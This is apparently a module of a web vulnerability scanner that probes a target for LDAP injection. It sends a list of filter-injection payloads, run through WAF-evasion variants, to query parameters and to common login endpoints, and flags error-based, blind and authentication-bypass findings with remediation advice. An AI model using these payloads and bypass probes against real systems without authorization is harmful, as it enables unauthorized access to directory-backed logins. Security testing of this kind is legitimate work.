"""
ldap_scanner.py — LDAP Injection Scanner
=========================================
Tests query parameters for LDAP filter injection including wildcard bypass
and boolean blind injection targeting enterprise SSO/Active Directory apps.
Includes 10+ injection payloads, error-based detection, and auth bypass tests.
"""
import urllib.parse
from scanners.base_scanner import BaseScanner
from utils.anomaly import TimingAnomalyDetector, SizeAnomalyDetector
from utils.evasion import waf_evade

LDAP_PAYLOADS = [
    ("*",                              "Wildcard — match all LDAP entries"),
    ("*)(uid=*",                       "Filter escape — enumerate users"),
    ("admin)(&(password=",             "Boolean injection — auth bypass attempt"),
    ("*)(|(objectClass=*",             "OR-clause injection"),
    (")(|(cn=*",                       "Blind LDAP boolean true"),
    ("x)(objectClass=*",               "Object dump attempt"),
    ("*)(|(uid=*",                     "OR injection enumerate users"),
    ("admin*",                         "Wildcard admin bypass"),
    ("*|*",                            "Pipe wildcard"),
    ("*)(uid=*)(|(uid=*",              "Nested OR injection"),
    ("*)(|(cn=*)(cn=*",                "Multi-attribute OR"),
    ("admin)(&)",                      "Empty AND bypass"),
    ("*))(|(cn=*",                     "Close-paren injection"),
    ("*)(&(objectClass=*",             "AND-clause injection"),
    ("*)(|(samaccountname=*",          "AD sAMAccountName injection"),
    (")(&(memberOf=cn=admin",          "Group membership injection"),
]

LDAP_ERROR_SIGNATURES = [
    "ldap", "ldap_search", "ldap_bind", "invalid dn", "ldap error",
    "filter error", "javax.naming", "com.sun.jndi", "ldapexception",
    "naming exception", "bad filter", "invalid filter",
    "javax.naming.NameNotFoundException", "javax.naming.directory",
    "LDAPException", "result code 32", "result code 34",
    "no such object", "SearchResult", "size limit exceeded",
    "protocol error", "operations error", "time limit exceeded",
    "admin limit exceeded", "auth method not supported",
    "stronger auth required", "referral", "saslBind in progress",
    "inappropriate matching", "constraint violation",
    "invalid syntax", "undefined attribute type",
    "unavailable critical extension", "confidentiality required",
    "insufficient access rights", "busy", "unavailable",
    "unwilling to perform", "loop detected",
    "javax.naming.AuthenticationException",
    "javax.naming.AuthenticationNotSupportedException",
    "javax.naming.CommunicationException",
    "javax.naming.InvalidNameException",
    "javax.naming.directory.InvalidAttributeValueException",
]

# Auth endpoints to test
AUTH_ENDPOINTS = ["/login", "/auth", "/api/login", "/api/auth",
                  "/api/v1/login", "/signin", "/authenticate"]


class LdapScanner(BaseScanner):
    SCANNER_NAME = "LDAP Injection Scanner"
    _SCANNER_KEY = "ldap"

    def __init__(self, scan_id, target, domain, **kwargs):
        super().__init__(scan_id, target, domain, **kwargs)

    def run(self) -> list:
        self.log("INFO", f"[LDAP] Testing LDAP injection on {self.target}...")
        parsed = urllib.parse.urlparse(self.target)
        qs = urllib.parse.parse_qsl(parsed.query)

        self._size_detector = SizeAnomalyDetector()

        if not qs:
            self.log("INFO", "[LDAP] No query parameters. Testing auth endpoints...")
            self._test_auth_endpoints()
            self._test_json_auth()
            return self.vulns

        baseline, _ = self._make_request(self.target)
        baseline_len = len(baseline) if baseline else 0

        for k, v in qs:
            for payload, desc in LDAP_PAYLOADS:
                for eva_name, eva_payload in waf_evade(payload):
                    injected = [(k_p, eva_payload if k_p == k else v_p) for k_p, v_p in qs]
                    url = parsed._replace(query=urllib.parse.urlencode(injected)).geturl()
                    resp, status = self._make_request(url)
                    if not resp:
                        continue

                    resp_lower = resp.lower()

                    if any(sig in resp_lower for sig in LDAP_ERROR_SIGNATURES):
                        self._report_error_based(k, eva_payload, desc, url, status)
                        return self.vulns

                    self._size_detector.record_size(len(resp))
                    if baseline_len > 0 and self._size_detector.test_size(len(resp), 1.5) and len(resp) > baseline_len * 1.4 and len(resp) > 300:
                        self._report_blind(k, eva_payload, desc, url, baseline_len, len(resp))
                        return self.vulns

        self._test_auth_endpoints()
        self.log("SUCCESS", "[LDAP] No LDAP injection detected.")
        return self.vulns

    def _test_auth_endpoints(self):
        base = self.target.rstrip("/")
        for ep in AUTH_ENDPOINTS[:4]:
            url = base + ep
            for payload, desc in LDAP_PAYLOADS[:5]:
                for eva_name, eva_payload in waf_evade(payload):
                    data = urllib.parse.urlencode({"username": eva_payload, "password": eva_payload}).encode()
                    body, status = self._make_request(url, "POST", data,
                        {"Content-Type": "application/x-www-form-urlencoded"})
                    if body and status == 200 and any(k in body.lower() for k in ("token", "success", "welcome")):
                        self.add_vuln(
                            title=f"LDAP Auth Bypass via Injection at {ep}",
                            severity="Critical",
                            category="LDAP Injection",
                            cvss_score=10.0,
                            cwe_ids=["CWE-90"],
                            owasp_category="A03:2021 – Injection",
                            confidence="High",
                            description=f"Sending LDAP payload `{eva_payload}` ({desc}) to `{ep}` returned "
                                f"HTTP 200 with success indicators. Authentication bypassed.",
                            remediation="Sanitize all LDAP input. Use parameterized LDAP filters.",
                            payload=eva_payload,
                            evidence=f"HTTP 200 with auth success for payload: {eva_payload}",
                            request_details=f"POST {url} username={eva_payload} password={eva_payload}",
                            response_details=f"HTTP {status} with auth success indicator",
                        )
                        return

    def _test_json_auth(self):
        """Test JSON auth endpoints with LDAP injection payloads."""
        base = self.target.rstrip("/")
        for ep in ["/api/login", "/api/auth", "/api/v1/auth"]:
            url = base + ep
            for payload, desc in LDAP_PAYLOADS[:4]:
                for eva_name, eva_payload in waf_evade(payload):
                    import json
                    data = json.dumps({"username": eva_payload, "password": eva_payload}).encode()
                    body, status = self._make_request(url, "POST", data,
                        {"Content-Type": "application/json"})
                    if body and status == 200 and any(k in body.lower() for k in ("token", "success", "welcome")):
                        self.add_vuln(
                            title=f"LDAP Auth Bypass via JSON Injection at {ep}",
                            severity="Critical",
                            category="LDAP Injection",
                            cvss_score=10.0,
                            cwe_ids=["CWE-90"],
                            owasp_category="A03:2021 – Injection",
                            confidence="High",
                            description=f"LDAP payload `{eva_payload}` via JSON body to `{ep}` returned "
                                "HTTP 200 with success indicators.",
                            remediation="Sanitize all LDAP input. Use parameterized LDAP filters.",
                            payload=eva_payload,
                            evidence="HTTP 200 with auth success indicator",
                            request_details=f"POST {url} JSON body with LDAP payload",
                            response_details=f"HTTP {status}",
                        )
                        return

    def _report_error_based(self, param, payload, desc, url, status):
        self.add_vuln(
            title=f"LDAP Injection in parameter `{param}` (Error-Based)",
            severity="Critical",
            category="LDAP Injection",
            cvss_score=9.8,
            cwe_ids=["CWE-90"],
            owasp_category="A03:2021 – Injection",
            confidence="High",
            description=f"Injecting LDAP payload `{payload}` ({desc}) into `{param}` "
                "triggered LDAP error signatures in the response, confirming the "
                "backend constructs LDAP queries from user input.\n\n"
                "This can bypass authentication and enumerate directory objects.",
            remediation="1. Use parameterized LDAP queries (never string concatenation).\n"
                "2. Escape special chars: (, ), *, \\, NUL, /, \\0.\n"
                "3. Validate input server-side against strict allowlists.\n"
                "4. Use least-privilege service accounts for LDAP queries.",
            payload=payload,
            evidence=f"LDAP error signature detected for payload: {payload}",
            request_details=f"GET {url}",
            response_details=f"HTTP {status} with LDAP error signature",
        )
        self.log("CRITICAL", f"[LDAP] Error-based injection confirmed in `{param}`!")

    def _report_blind(self, param, payload, desc, url, baseline_len, injected_len):
        self.add_vuln(
            title=f"Possible Blind LDAP Injection in `{param}` (Response Anomaly)",
            severity="High",
            category="LDAP Injection",
            cvss_score=8.1,
            cwe_ids=["CWE-90"],
            owasp_category="A03:2021 – Injection",
            confidence="Medium",
            description=f"LDAP wildcard `{payload}` ({desc}) in `{param}` returned "
                f"{injected_len} bytes vs baseline {baseline_len} bytes — a "
                f"{injected_len // max(baseline_len, 1)}x increase. "
                "This may indicate blind LDAP injection expanding query results.",
            remediation="Sanitize all LDAP input. Reject wildcard characters in user-facing fields.",
            payload=payload,
            evidence=f"Response size delta: {injected_len - baseline_len}B",
            request_details=f"GET {url}",
            response_details=f"Response size: {injected_len}B vs baseline {baseline_len}B",
        )
        self.log("CRITICAL", f"[LDAP] Blind injection detected in `{param}`!")
